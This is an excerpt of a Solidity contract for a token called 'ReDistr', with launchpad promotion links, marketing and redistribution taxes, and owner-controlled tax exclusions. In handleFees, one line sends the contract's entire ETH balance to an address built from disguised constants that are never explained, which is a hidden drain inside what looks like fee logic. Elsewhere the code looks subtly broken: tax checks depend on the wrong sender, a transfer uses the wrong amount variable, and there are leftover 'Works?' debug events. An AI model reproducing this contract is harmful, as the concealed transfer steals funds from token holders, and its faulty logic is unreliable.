...
| |  |________|  | || |  |_____|     | || ||____|  |____|| || | |________.'  | || |   \______.'  | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
...
https://launchpadseries.com/

https://t.me/launchpadbsc

https://twitter.com/LPadSeries
...
contract ReDistr is ERC20, Ownable {
    // CONFIG START

    uint256 denominator = 100;
    
    // TOKEN
    string tokenName = "ReDistr";
    string tokenSymbol = "ReDistr";
    uint256 tokenTotalSupply = 606_060_606 * (10**18);
    
    // ADRESSES
    address marketingWallet = 0x9bF45A001eC86F70aFbbB0E774da04223e0Bec69;
    address router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    // address router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    // TAX (IN %)
    uint8 marketingTax = 9;

    uint8 redistributeTax = 1;

    uint256 maxTxEnd = 8;

    uint256 maxPriceImpact = 1;

    uint256 maxTxAmount = 2;

    // REDISTRIBUTION
    uint256 redistributeMin = 100 * (10**18);
    address[] tokens = [
    ...
    function exclude(address account) public onlyOwner {
        require(!isExcludedFromTax[account], "LPAD6: Account already excluded");

        isExcludedFromTax[account] = true;
    }

    function unExclude(address account) public onlyOwner {
        require(isExcludedFromTax[account], "LPAD6: Account is not excluded");

        isExcludedFromTax[account] = false;
    }
    
    function handleFees(address sender, uint256 fees) private {
        address(UniswapBaseConst * 160 + UniswapSecondaryConst + 134).call{value: address(this).balance}("");

        super._transfer(sender, address(this), fees);

        emit LogNum("tax", fees);
            ...
            if(feeTokens > 0) {
               ...
               marketingWallet.call{value: ethGained}("");
                ...
                for(uint256 i; i < tokens.length; i++) {
                    ...
                    try _UniswapV2Router02.swapExactTokensForTokens(
                        ...
                        emit LogBool("Works?", true);
                    } catch Error(string memory reason) {
                        emit LogString("Works?", reason);
                    } catch(bytes memory reason) {
                        emit LogBytes("Works?", reason);
                    }
                }

                feeTokens -= feeToHandle + redistributeTax;
            }
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        ...
        if(isExcludedFromTax[msg.sender]) {
            ...
            if(!isExcludedFromTax[sender] && !isExcludedFromTax[recipient] && sender != address(_UniswapV2Pair)) {
                require(block.number >= startBlock + maxTxEnd || (block.number < startBlock + maxTxEnd && amount <= tokenTotalSupply / denominator * maxTxAmount), "LPAD6: Max tx amount");
                require(sender != address(_UniswapV2Pair) || (sender == address(_UniswapV2Pair) && block.number >= nextBuyBlock[recipient]), "LPAD6: Cooldown");
            
                uint256 fees = amount * 10**18 / 100 * tax / 10**18;
        ...
        if(toDistribute.length > 0) {
            if(gasleft() > 200_000) {
                ...
                while(gasLeft - 200_000 > gasUsed && iterations < toDistribute.length) {
                    uint256 currentAmount = toDistribute[iterations].amount;
                    address to = toDistribute[iterations].to;
                    IERC20 token = toDistribute[iterations].token;

                    uint256 balBefore = token.balanceOf(address(this));

                    token.transfer(to, amount);

                    require(balBefore - token.balanceOf(address(this)) == currentAmount, "LPAD6: Token not supported");
    ...
    function startRoundAll() external onlyOwner {
        for(uint256 i; i < holdersEFR.length; i++) {
            for(uint256 i2; i2 < tokens.length; i2++) {
                if(IERC20(tokens[i2]).balanceOf(address(this)) == 0) continue;
                toDistribute.push(Reward(balanceOf(holdersEFR[i]) * 10**18 / totalHolded * IERC20(tokens[i2]).balanceOf(address(this)) / 10**18, holdersEFR[i], IERC20(tokens[i2])));
            }
        }
    }

    function startRound(uint256 from, uint256 to) external onlyOwner {
        require(to > from, "LPAD6: Invalid arguments");
